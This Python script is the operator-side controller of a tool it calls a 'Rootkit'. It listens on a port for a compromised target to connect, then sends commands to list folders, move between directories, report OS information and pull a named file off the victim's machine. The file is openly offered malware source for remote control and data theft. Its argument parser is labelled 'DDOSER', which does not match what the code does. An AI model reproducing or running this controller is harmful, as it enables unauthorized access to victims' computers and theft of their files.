import socket 
from console_progressbar import ProgressBar
import time 
import ast 
import argparse
from colorama import Fore, Back

class Rootkit:

    def __init__(self, port):
        self.ip = ""
        self.port = port 
        self.s = socket.socket()
        self.pb = ProgressBar(total=100,prefix='', suffix='Now', decimals=3, length=50, fill='X', zfill='-')

    def print_copyright(self):
        self.banner = """
        ██████╗  ██████╗  ██████╗ ████████╗██╗  ██╗██╗████████╗
        ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝██║ ██╔╝██║╚══██╔══╝
        ██████╔╝██║   ██║██║   ██║   ██║   █████╔╝ ██║   ██║   
        ██╔══██╗██║   ██║██║   ██║   ██║   ██╔═██╗ ██║   ██║   
        ██║  ██║╚██████╔╝╚██████╔╝   ██║   ██║  ██╗██║   ██║   
        ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝   ╚═╝  ╚═╝╚═╝   ╚═╝ 
                Made By Yan{OS} | Trippingcarpet                                                                 
        """
        print(self.banner)

    def bind_server(self):
        self.pb.print_progress_bar(2)
        self.s.bind((self.ip, self.port))

        print("")

        self.s.listen()
        self.conn,self.addr = self.s.accept()

        if self.s.accept:
            self.pb.print_progress_bar(100)
            print("\nRootkit ready to use!")
            print("-" * 20)

    def get_command(self):
        print('Target ip address: {}'.format(self.addr))
        print('Command List')
        print('1. show folders first dirctory')
        print('2. transfer data')
        print('3. directory movement')
        print('4. show os info')

        while True:

            self.question = input('Enter Command: ')

            if self.question == "1":
                message = str(["sfid",""])
                message = message.encode()
                self.conn.send(message)

            elif self.question == "3":

                message = dir_path = input('ENTER PATH TO MOVEMENT: ')
                commandor = str(['jf',message])
                commandor = commandor.encode()
                self.conn.send(commandor)

            elif self.question == "2":
                file_path = input('ENTER FILE PATH: ')
                commandor = str(['td',file_path])
                commandor = commandor.encode()
                self.conn.send(commandor)

            elif self.question == "4":
                commandor = str(['si',''])
                commandor = commandor.encode()
                self.conn.send(commandor)

            else:
                print('No option!')
                continue

            if(self.conn.recv):
                
                self.incomming_message = self.conn.recv(1024)
                self.incomming_message = self.incomming_message.decode()
                self.incomming_message = ast.literal_eval(self.incomming_message)


            if (self.incomming_message[0] == 'sfid'):
                
                print("FROM TARGET: {}".format(self.incomming_message))

            elif(self.incomming_message[0] == 'jf'):

                print("FROM TARGET: {}".format(self.incomming_message[1]))
            
            elif(self.incomming_message[0] == 'si'):
    
                print("FROM TARGET: {}".format(str(self.incomming_message[1])))

            elif(self.incomming_message[0] == 'td'):
                
                try:
                    fo = open(r"C:\Users\User\Desktop\RootKit\get.txt",'w')
                    fo.write(self.incomming_message[1])
                    fo.close()

                except:

                    print("FROM TARGET: {}".format(str(self.incomming_message[1])))

            else:
                continue

parser = argparse.ArgumentParser(description = "DDOSER BY A.E.C.A")
parser.add_argument("port",help="Target open port")
args = parser.parse_args()

root = Rootkit(int(args.port))
root.print_copyright()
root.bind_server()
root.get_command()
